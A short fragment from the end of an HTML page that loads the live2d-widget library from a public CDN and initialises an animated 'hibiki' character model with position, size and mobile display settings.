<script src="https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-hibiki@1.0.5/assets/hibiki.model.json"},"display":{"position":"left","width":160,"height":350},"mobile":{"show":true},"log":false});</script></body>
</html>
